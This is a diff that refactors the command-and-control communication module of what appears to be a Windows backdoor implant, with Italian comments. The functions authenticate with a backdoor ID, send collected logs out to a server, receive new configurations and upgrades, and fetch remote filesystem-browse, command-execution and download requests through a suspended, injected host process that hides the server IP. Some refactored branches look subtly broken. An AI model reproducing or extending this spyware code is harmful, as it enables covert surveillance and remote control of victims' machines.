@@ -20,25 +20,25 @@ DWORD ASP_Poll()
 		return ASP_POLL_ERROR;
 
 	// Se sta ancora eseguendo l'operazione
-	if (ASP_IPC_command->status == ASP_FETCH)
+	if (ASP_IPC_command->ctrl.status == ASP_FETCH)
 		return ASP_POLL_FETCHING;
 
 	// ASP ha tornato un errore
-	if (ASP_IPC_command->status == ASP_ERROR) {
-		ASP_IPC_command->status = ASP_NOP;
+	if (ASP_IPC_command->ctrl.status == ASP_ERROR) {
+		ASP_IPC_command->ctrl.status = ASP_NOP;
 		return ASP_POLL_ERROR;
 	}
 
 	// Se lo status e' ASP_NOP o ASP_DONE.
 	// Puo' settare ASP_IPC_command->status, tanto se non e' in
 	// ASP_FETCH l'host ASP non modifica piu' lo status
-	ASP_IPC_command->status = ASP_NOP;
+	ASP_IPC_command->ctrl.status = ASP_NOP;
 	return ASP_POLL_DONE;
 
 }
 
 // Aspetta che l'host ASP abbia terminato la richiesta
-BOOL ASP_Wait_Response()
+static BOOL ASP_Wait_Response()
 {
 	LOOP{
 		DWORD ret_val;
@@ -98,9 +98,9 @@ DWORD ASP_Setup(char* asp_server, ASP_THREAD *asp_thread)
 // Inizializza nel core la shared memory per ASP
 BOOL ASP_IPCSetup()
 {
-	hASPIPCcommandfile = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ASP_IPC_CTRL), shared.SHARE_MEMORY_ASP_COMMAND_NAME);
-	if (hASPIPCcommandfile)
-		ASP_IPC_command = (ASP_IPC_CTRL*)FNC(MapViewOfFile)(hASPIPCcommandfile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPC_CTRL));
+	hASP_CmdFile = FNC(CreateFileMappingA)(INVALID_HANDLE_VALUE, NULL, PAGE_READWRITE, 0, sizeof(ASP_IPC_CTRL), shared.SHARE_MEMORY_ASP_COMMAND_NAME);
+	if (hASP_CmdFile)
+		ASP_IPC_command = (ASP_IPC_CTRL*)FNC(MapViewOfFile)(hASP_CmdFile, FILE_MAP_ALL_ACCESS, 0, 0, sizeof(ASP_IPC_CTRL));
 
 	if (ASP_IPC_command) {
 		memset(ASP_IPC_command, 0, sizeof(ASP_IPC_CTRL));
@@ -111,14 +111,15 @@ BOOL ASP_IPCSetup()
 }
 
 // Chiude nel core la shared memory per ASP
-void ASP_IPCClose()
+static void ASP_IPCClose()
 {
 	if (ASP_IPC_command) {
 		FNC(UnmapViewOfFile)(ASP_IPC_command);
 		ASP_IPC_command = NULL;
+		CloseHandle(hASP_CmdFile);
 	}
-
-	SAFE_CLOSE_HANDLE(hASPIPCcommandfile);
+	hASP_CmdFile = NULL;
+	ASP_IPC_command = NULL;
 }
 
 
@@ -148,8 +149,8 @@ BOOL ASP_Start(char* process_name, char* asp_server)
 	// Deve essere sempre il primo comando dato all'host ASP
 	// che si conclude con il ritorno dell'ip da nascondere
 	// (necessario per poter fare ASP_Poll() in seguito
-	ASP_IPC_command->action = ASP_SETUP;
-	ASP_IPC_command->status = ASP_FETCH;
+	ASP_IPC_command->ctrl.action = ASP_SETUP;
+	ASP_IPC_command->ctrl.status = ASP_FETCH;
 
 	// Lancia il process ASP host con il main thread stoppato
 	ZeroMemory(&si, sizeof(si));
@@ -249,75 +250,93 @@ void ASP_Stop()
 	}
 }
 
+template<typename Fn, typename... Args>
+bool execute_asp_command(WORD action, BOOL wait, BOOL check_result, Fn setup, Args... args)
+{
+	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->ctrl.status != ASP_NOP)
+		return false;
+
+	ASP_IPC_command->ctrl.action = action;
+	setup(args...);
+	ASP_IPC_command->ctrl.status = ASP_FETCH;
+
+	if (check_result) {
+		if (ASP_Wait_Response() == FALSE)
+			return false;
+	}
+
+	if (wait) {
+		return ASP_Wait_Response();
+	}
+	return true;
+}
+
+static void setup_nothing()
+{
+
+}
+
 // Chiude gentilmente la connessione col server
 void ASP_Bye()
 {
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return;
-	ASP_IPC_command->action = ASP_BYE;
-	ASP_IPC_command->status = ASP_FETCH;
-
-	ASP_Wait_Response();
+	execute_asp_command(ASP_BYE, TRUE, FALSE, setup_nothing);
 }
 
-// Il core la chiama per eseguire il passo AUTH del protocollo
-// Se torna FALSE la sync dovrebbe essere interrotta
-// response_command deve essere allocato dal chiamante
-BOOL ASP_Auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
+static void setup_auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
 {
 	ASP_REQUEST_AUTH* ra;
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
-
-	// Passa i comandi all'host per eseguire l'auth
-	ASP_IPC_command->action = ASP_AUTH;
 	ra = (ASP_REQUEST_AUTH*)ASP_IPC_command->in_param;
 	_snprintf_s(ra->backdoor_id, sizeof(ra->backdoor_id), _TRUNCATE, "%s", backdoor_id);
 	_snprintf_s(ra->subtype, sizeof(ra->subtype), _TRUNCATE, "%s", subtype);
 	memcpy(ra->instance_id, instance_id, sizeof(ra->instance_id));
 	memcpy(ra->conf_key, conf_key, sizeof(ra->conf_key));
-	ASP_IPC_command->status = ASP_FETCH;
+}
+// Il core la chiama per eseguire il passo AUTH del protocollo
+// Se torna FALSE la sync dovrebbe essere interrotta
+// response_command deve essere allocato dal chiamante
+BOOL ASP_Auth(char* backdoor_id, BYTE* instance_id, char* subtype, BYTE* conf_key, DWORD* response_command)
+{
+	if (execute_asp_command(ASP_AUTH, TRUE, FALSE, setup_auth, backdoor_id, instance_id, subtype, conf_key, response_command))
+	{
+		memcpy(response_command, &ASP_IPC_command->out_command, sizeof(DWORD));
+		return TRUE;
+	}
 
-	if (!ASP_Wait_Response())
-		return FALSE;
-
-	memcpy(response_command, &ASP_IPC_command->out_command, sizeof(DWORD));
-	return TRUE;
+	return FALSE;
 }
 
+static void setup_id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
+{
+	ASP_REQUEST_ID* ri;
+
+	ri = (ASP_REQUEST_ID*)ASP_IPC_command->in_param;
+	_snwprintf_s(ri->username, sizeof(ri->username) / sizeof(WCHAR), _TRUNCATE, L"%s", username);
+	_snwprintf_s(ri->device, sizeof(ri->device) / sizeof(WCHAR), _TRUNCATE, L"%s", device);
+}
 // Il core la chiama per eseguire il passo AUTH del protocollo
 // Se torna FALSE la sync dovrebbe essere interrotta
 // time_date e availables devono essere allocati dal chiamante
 BOOL ASP_Id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availables, DWORD size_avail)
 {
-	ASP_REQUEST_ID* ri;
+	if (execute_asp_command(ASP_IDBCK, TRUE, FALSE, setup_id, username, device, time_date, availables, size_avail))
+	{
+		// Non puo' rispondere altro che proto OK, quindi ignoro out_command
+		memcpy(time_date, &ASP_IPC_command->out_param, sizeof(long long));
+		memcpy(availables, &ASP_IPC_command->out_param[sizeof(long long)], size_avail);
+		return TRUE;
+	}
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
+	return FALSE;
 
-	// Passa i comandi all'host per eseguire l'id
-	ASP_IPC_command->action = ASP_IDBCK;
-	ri = (ASP_REQUEST_ID*)ASP_IPC_command->in_param;
-	_snwprintf_s(ri->username, sizeof(ri->username) / sizeof(WCHAR), _TRUNCATE, L"%s", username);
-	_snwprintf_s(ri->device, sizeof(ri->device) / sizeof(WCHAR), _TRUNCATE, L"%s", device);
-	ASP_IPC_command->status = ASP_FETCH;
-
-	if (!ASP_Wait_Response())
-		return FALSE;
-
-	// Non puo' rispondere altro che proto OK, quindi ignoro out_command
-
-	memcpy(time_date, &ASP_IPC_command->out_param, sizeof(long long));
-	memcpy(availables, &ASP_IPC_command->out_param[sizeof(long long)], size_avail);
-
-	return TRUE;
 }
 
+static void setup_getupload(BOOL is_upload, WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
+{
+	ZeroMemory(file_name, file_name_len);
+	*upload_left = 0;
+
+}
 // Il core la chiama per ricevere un upload (is_upload e' TRUE) o un upgrade
 // Ritorna il file_name (deve essere allocato dal chiamante), e il numero di upload rimanenti
 // Se file_name e' tutto 0 vuol dire che c'e' stato un problema.
@@ -325,143 +344,115 @@ BOOL ASP_Id(WCHAR* username, WCHAR* device, long long* time_date, DWORD* availab
 BOOL ASP_GetUpload(BOOL is_upload, WCHAR* file_name, DWORD file_name_len, DWORD* upload_left)
 {
 	ASP_REPLY_UPLOAD* ru;
+	if (is_upload && execute_asp_command(ASP_UPLO, TRUE, FALSE, setup_getupload, is_upload, file_name, file_name_len, upload_left))
+	{
+		if (ASP_IPC_command->out_command == PROTO_NO)
+			return TRUE;
+		ru = (ASP_REPLY_UPLOAD*)ASP_IPC_command->out_param;
+		*upload_left = ru->upload_left;
+		_snwprintf_s(file_name, file_name_len / sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
+		return TRUE;
+	}
+	else if (execute_asp_command(ASP_UPGR, TRUE, FALSE, setup_getupload, is_upload, file_name, file_name_len, upload_left))
+	{
+		if (ASP_IPC_command->out_command == PROTO_NO)
+			return TRUE;
+		ru = (ASP_REPLY_UPLOAD*)ASP_IPC_command->out_param;
+		*upload_left = ru->upload_left;
+		_snwprintf_s(file_name, file_name_len / sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);
 
-	ZeroMemory(file_name, file_name_len);
-	*upload_left = 0;
-
-	// Passa i comandi all'host per eseguire l'upload/upgrade
-	if (is_upload)
-		ASP_IPC_command->action = ASP_UPLO;
-	else
-		ASP_IPC_command->action = ASP_UPGR;
-	ASP_IPC_command->status = ASP_FETCH;
-
-	if (!ASP_Wait_Response())
-		return FALSE;
-
-	if (ASP_IPC_command->out_command == PROTO_NO)
 		return TRUE;
 
-	ru = (ASP_REPLY_UPLOAD*)ASP_IPC_command->out_param;
-	*upload_left = ru->upload_left;
-	_snwprintf_s(file_name, file_name_len / sizeof(WCHAR), _TRUNCATE, L"%s", ru->file_name);
-
-	return TRUE;
+	}
+	return FALSE;
 }
 
+static void setup_sendlog(char* file_name, DWORD byte_per_second)
+{
+	ASP_REQUEST_LOG* rl;
+	rl = (ASP_REQUEST_LOG*)ASP_IPC_command->in_param;
+	_snwprintf_s(rl->file_name, sizeof(rl->file_name) / sizeof(WCHAR), _TRUNCATE, L"%S", file_name);
+	rl->byte_per_second = byte_per_second;
+}
 // Manda un file di log
 // Prende in input il path del log da mandare e il bandlimit
 BOOL ASP_SendLog(char* file_name, DWORD byte_per_second)
 {
-	ASP_REQUEST_LOG* rl;
+	if (execute_asp_command(ASP_SLOG, TRUE, FALSE, setup_sendlog, file_name, byte_per_second))
+	{
+		// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
+		if (ASP_IPC_command->out_command == PROTO_OK)
+			return TRUE;
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
-
-	ASP_IPC_command->action = ASP_SLOG;
-	rl = (ASP_REQUEST_LOG*)ASP_IPC_command->in_param;
-	_snwprintf_s(rl->file_name, sizeof(rl->file_name) / sizeof(WCHAR), _TRUNCATE, L"%S", file_name);
-	rl->byte_per_second = byte_per_second;
-	ASP_IPC_command->status = ASP_FETCH;
-
-	if (!ASP_Wait_Response())
-		return FALSE;
-
-	// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
-	if (ASP_IPC_command->out_command != PROTO_OK)
-		return FALSE;
-
-	return TRUE;
+	}
+	return FALSE;
 }
 
+static void setup_sendstatus(DWORD log_count, UINT64 log_size)
+{
+	ASP_REQUEST_STAT* rs;
+	rs = (ASP_REQUEST_STAT*)ASP_IPC_command->in_param;
+	rs->log_count = log_count;
+	rs->log_size = log_size;
+}
 // Manda lo status dei log da spedire
 // Prende in input numero e size dei log (qword)
 BOOL ASP_SendStatus(DWORD log_count, UINT64 log_size)
 {
-	ASP_REQUEST_STAT* rs;
-
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
-
-	ASP_IPC_command->action = ASP_SSTAT;
-	rs = (ASP_REQUEST_STAT*)ASP_IPC_command->in_param;
-	rs->log_count = log_count;
-	rs->log_size = log_size;
-	ASP_IPC_command->status = ASP_FETCH;
-
-	if (!ASP_Wait_Response())
-		return FALSE;
-
-	if (ASP_IPC_command->out_command != PROTO_OK)
-		return FALSE;
-
-	return TRUE;
+	if (execute_asp_command(ASP_SSTAT, TRUE, FALSE, setup_sendstatus, log_count, log_size))
+	{
+		if (ASP_IPC_command->out_command == PROTO_OK)
+			return TRUE;
+	}
+	
+	return FALSE;
 }
 
+static void setup_receiveconf(char* conf_file_path)
+{
+	ASP_REQUEST_CONF* rc;
+	rc = (ASP_REQUEST_CONF*)ASP_IPC_command->in_param;
+	_snwprintf_s(rc->conf_path, sizeof(rc->conf_path) / sizeof(WCHAR), _TRUNCATE, L"%S", conf_file_path);
+
+}
 // Riceve la nuova configurazione
 // Il file viene salvato nel path specificato (CONF_BU)
 BOOL ASP_ReceiveConf(char* conf_file_path)
 {
-	ASP_REQUEST_CONF* rc;
+	if (execute_asp_command(ASP_NCONF, TRUE, FALSE, setup_receiveconf, conf_file_path))
+	{
+		// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
+		if (ASP_IPC_command->out_command == PROTO_OK)
+			return TRUE;
+	}
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
-
-	ASP_IPC_command->action = ASP_NCONF;
-	rc = (ASP_REQUEST_CONF*)ASP_IPC_command->in_param;
-	_snwprintf_s(rc->conf_path, sizeof(rc->conf_path) / sizeof(WCHAR), _TRUNCATE, L"%S", conf_file_path);
-	ASP_IPC_command->status = ASP_FETCH;
-
-	if (!ASP_Wait_Response())
-		return FALSE;
-
-	// Se un log non viene spedito correttamente non lo cancella (e interrompe la sync)
-	if (ASP_IPC_command->out_command != PROTO_OK)
-		return FALSE;
-
-	return TRUE;
+	return FALSE;
 }
 
 // Ottiene i dati necessari per una richiesta di purge dei log
 BOOL ASP_HandlePurge(long long* purge_time, DWORD* purge_size)
 {
-	ASP_REPLY_PURGE* arp;
+	if (execute_asp_command(ASP_PURGE, TRUE, FALSE, setup_nothing))
+	{
+		ASP_REPLY_PURGE* arp;
 
-	*purge_time = 0;
-	*purge_size = 0;
+		*purge_time = 0;
+		*purge_size = 0;
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
+		// Controlla il response e la lunghezza minima di una risposta
+		if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(ASP_REPLY_PURGE))
+			return FALSE;
 
-	ASP_IPC_command->action = ASP_PURGE;
-	ASP_IPC_command->status = ASP_FETCH;
+		// Numero di download richiesti
+		arp = (ASP_REPLY_PURGE*)ASP_IPC_command->out_param;
+		*purge_time = arp->purge_time;
+		*purge_size = arp->purge_size;
 
-	if (!ASP_Wait_Response())
-		return FALSE;
+		return TRUE;
+	}
 
-	// Controlla il response e la lunghezza minima di una risposta
-	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(ASP_REPLY_PURGE))
-		return FALSE;
-
-	// Numero di download richiesti
-	arp = (ASP_REPLY_PURGE*)ASP_IPC_command->out_param;
-	*purge_time = arp->purge_time;
-	*purge_size = arp->purge_size;
-
-	return TRUE;
+	return FALSE;
 }
 
 
@@ -470,100 +461,88 @@ BOOL ASP_HandlePurge(long long* purge_time, DWORD* purge_size)
 // Se torna TRUE ha allocato fs_array (che va liberato) di num_elem elementi
 BOOL ASP_GetFileSystem(DWORD* num_elem, fs_browse_elem** fs_array)
 {
-	BYTE* ptr;
-	DWORD i, ret_len, elem_count;
+	if (execute_asp_command(ASP_FSYS, TRUE, FALSE, setup_nothing))
+	{
+		BYTE* ptr;
+		DWORD i, ret_len, elem_count;
 
-	*num_elem = 0;
+		*num_elem = 0;
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
+		if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
+			return FALSE;
 
-	ASP_IPC_command->action = ASP_FSYS;
-	ASP_IPC_command->status = ASP_FETCH;
-
-	if (!ASP_Wait_Response())
-		return FALSE;
-
-	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
-		return FALSE;
-
-	// Numero di download richiesti
-	ptr = ASP_IPC_command->out_param;
-	elem_count = *((DWORD*)ptr);
-	ptr += sizeof(DWORD);
-	if (elem_count == 0)
-		return FALSE;
-
-	// Alloca l'array di elementi fs
-	*fs_array = (fs_browse_elem*)calloc(elem_count, sizeof(fs_browse_elem));
-	if (!(*fs_array))
-		return FALSE;
-
-	// Valorizza gli elementi dell'array
-	// e alloca tutte le stringhe di start_dir
-	for (i = 0; i < elem_count; i++) {
-		// profondita' (prima DWORD)
-		(*fs_array)[i].depth = *((DWORD*)ptr);
+		// Numero di download richiesti
+		ptr = ASP_IPC_command->out_param;
+		elem_count = *((DWORD*)ptr);
 		ptr += sizeof(DWORD);
-		// start dir (stringa pascalizzata)
-		if (!((*fs_array)[i].start_dir = UnPascalizeString(ptr, &ret_len)))
-			break;
+		if (elem_count == 0)
+			return FALSE;
 
-		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
-		ptr += (ret_len + sizeof(DWORD));
+		// Alloca l'array di elementi fs
+		*fs_array = (fs_browse_elem*)calloc(elem_count, sizeof(fs_browse_elem));
+		if (!(*fs_array))
+			return FALSE;
+
+		// Valorizza gli elementi dell'array
+		// e alloca tutte le stringhe di start_dir
+		for (i = 0; i < elem_count; i++) {
+			// profondita' (prima DWORD)
+			(*fs_array)[i].depth = *((DWORD*)ptr);
+			ptr += sizeof(DWORD);
+			// start dir (stringa pascalizzata)
+			if (!((*fs_array)[i].start_dir = UnPascalizeString(ptr, &ret_len)))
+				break;
+
+			(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
+			ptr += (ret_len + sizeof(DWORD));
+		}
+	
+		return TRUE;
 	}
 
-	return TRUE;
+	return FALSE;
 }
 
 // Prende la lista delle richieste di esecuzione comandi
 // Se torna TRUE ha allocato cmd_array (che va liberato) di num_elem elementi
 BOOL ASP_GetCommands(DWORD* num_elem, WCHAR*** cmd_array)
 {
-	BYTE* ptr;
-	DWORD i, ret_len, elem_count;
+	if (execute_asp_command(ASP_CMDE, TRUE, FALSE, setup_nothing))
+	{
+		BYTE* ptr;
+		DWORD i, ret_len, elem_count;
 
-	*num_elem = 0;
+		*num_elem = 0;
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
+		if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
+			return FALSE;
 
-	ASP_IPC_command->action = ASP_CMDE;
-	ASP_IPC_command->status = ASP_FETCH;
+		// Numero di download richiesti
+		ptr = ASP_IPC_command->out_param;
+		elem_count = *((DWORD*)ptr);
+		ptr += sizeof(DWORD);
+		if (elem_count == 0)
+			return FALSE;
 
-	if (!ASP_Wait_Response())
-		return FALSE;
+		// Alloca l'array di elementi fs
+		*cmd_array = (WCHAR**)calloc(elem_count, sizeof(WCHAR*));
+		if (!(*cmd_array))
+			return FALSE;
 
-	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len == 0)
-		return FALSE;
+		// Valorizza gli elementi dell'array
+		for (i = 0; i < elem_count; i++) {
+			// i comandi sono una serie di stringhe pascalizzate
+			if (!((*cmd_array)[i] = UnPascalizeString(ptr, &ret_len)))
+				break;
 
-	// Numero di download richiesti
-	ptr = ASP_IPC_command->out_param;
-	elem_count = *((DWORD*)ptr);
-	ptr += sizeof(DWORD);
-	if (elem_count == 0)
-		return FALSE;
+			(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
+			ptr += (ret_len + sizeof(DWORD));
+		}
 
-	// Alloca l'array di elementi fs
-	*cmd_array = (WCHAR**)calloc(elem_count, sizeof(WCHAR*));
-	if (!(*cmd_array))
-		return FALSE;
-
-	// Valorizza gli elementi dell'array
-	for (i = 0; i < elem_count; i++) {
-		// i comandi sono una serie di stringhe pascalizzate
-		if (!((*cmd_array)[i] = UnPascalizeString(ptr, &ret_len)))
-			break;
-
-		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
-		ptr += (ret_len + sizeof(DWORD));
+		return TRUE;
 	}
 
-	return TRUE;
+	return FALSE;
 }
 
 // Prende la lista dei download
@@ -575,41 +554,34 @@ BOOL ASP_GetDownload(DWORD* num_elem, WCHAR*** string_array)
 
 	*num_elem = 0;
 
-	// Controlla che il processo host ASP sia ancora aperto e che non stia
-	// gia' eseguendo delle operazioni
-	if (!ASP_HostProcess || !ASP_IPC_command || ASP_IPC_command->status != ASP_NOP)
-		return FALSE;
+	if (execute_asp_command(ASP_DOWN, TRUE, FALSE, setup_nothing))
+	{
+		// Controlla il response e la lunghezza minima di una risposta
+		if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(DWORD))
+			return FALSE;
 
-	ASP_IPC_command->action = ASP_DOWN;
-	ASP_IPC_command->status = ASP_FETCH;
+		// Numero di download richiesti
+		ptr = ASP_IPC_command->out_param;
+		elem_count = *((DWORD*)ptr);
+		ptr += sizeof(DWORD);
+		if (elem_count == 0)
+			return FALSE;
 
-	if (!ASP_Wait_Response())
-		return FALSE;
+		// Alloca la lista di stringhe
+		*string_array = (WCHAR**)calloc(elem_count, sizeof(WCHAR*));
+		if (!(*string_array))
+			return FALSE;
 
-	// Controlla il response e la lunghezza minima di una risposta
-	if (ASP_IPC_command->out_command != PROTO_OK || ASP_IPC_command->out_param_len < sizeof(DWORD))
-		return FALSE;
+		// Alloca tutte le stringhe
+		for (i = 0; i < elem_count; i++) {
+			if (!((*string_array)[i] = UnPascalizeString(ptr, &ret_len)))
+				break;
 
-	// Numero di download richiesti
-	ptr = ASP_IPC_command->out_param;
-	elem_count = *((DWORD*)ptr);
-	ptr += sizeof(DWORD);
-	if (elem_count == 0)
-		return FALSE;
+			(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
+			ptr += (ret_len + sizeof(DWORD));
+		}
 
-	// Alloca la lista di stringhe
-	*string_array = (WCHAR**)calloc(elem_count, sizeof(WCHAR*));
-	if (!(*string_array))
-		return FALSE;
-
-	// Alloca tutte le stringhe
-	for (i = 0; i < elem_count; i++) {
-		if (!((*string_array)[i] = UnPascalizeString(ptr, &ret_len)))
-			break;
-
-		(*num_elem)++; // Torna solo il numero di stringhe effettivamente allocate
-		ptr += (ret_len + sizeof(DWORD));
+		return TRUE;
 	}
-
-	return TRUE;
+	return FALSE;
 }
